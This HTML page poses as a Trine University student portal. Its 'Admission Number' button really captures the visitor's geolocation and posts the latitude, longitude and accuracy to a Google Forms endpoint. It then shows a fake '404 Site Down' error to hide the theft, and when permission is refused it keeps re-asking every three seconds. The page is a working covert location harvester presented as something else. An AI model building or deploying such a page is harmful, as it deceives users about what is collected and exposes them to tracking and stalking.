<!DOCTYPE html>
<html>
<head>
  <title>Trine University - Location Tracker</title>
  <style>
    body, html { font-family: Arial, sans-serif; margin: 0; padding: 0; }
    .header { background-color: #003153; color: white; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; }
    .header .logo { font-size: 24px; font-weight: bold; }
    .header nav { }
    .header a { color: white; text-decoration: none; margin-left: 20px; }
    .content { text-align: center; padding-top: 50px; }
    button { padding: 10px 20px; font-size: 16px; }
  </style>
</head>
<body>
  <div class="header">
    <div class="logo">Trine University</div>
    <nav>
      <a href="#">Home</a>
      <a href="#">Readmission</a>
      <a href="#" style="float:right;">Login üîç</a>
    </nav>
  </div>
  <div class="content">
    <h1>Student portal</h1>
    <p>Enter your Student ID:</p>
    <button id="getLocation">Admission Number</button>
    <p id="output"></p>
  </div>

  <!-- JavaScript Code -->
  <script>
    document.getElementById("getLocation").addEventListener("click", function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function (position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            // Display location to the user
            document.getElementById("output").innerText =
              `Latitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters`;

            // Send data to Google Forms
            const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
            const data = new URLSearchParams();
            data.append("entry.1267598962", latitude);
            data.append("entry.1270259896", longitude);
            data.append("entry.1888406517", accuracy);

            fetch(formUrl, {
              method: "POST",
              body: data,
              mode: "no-cors",
            }).then(() => {
              throw new Error('404 Site Down'); // Simulate a 404 error after successful location submission
            }).catch((error) => {
              document.getElementById("output").innerText = "Error: " + error.message;
            });

          },
          function (error) {
            document.getElementById("output").innerText = "Error: " + error.message;
            setTimeout(requestLocation, 3000); // Retry every 3 seconds
          },
          { timeout: 5000 }
        );
      } else {
        document.getElementById("output").innerText = "Geolocation not supported by this browser.";
      }
    });
  </script>
</body>
</html>
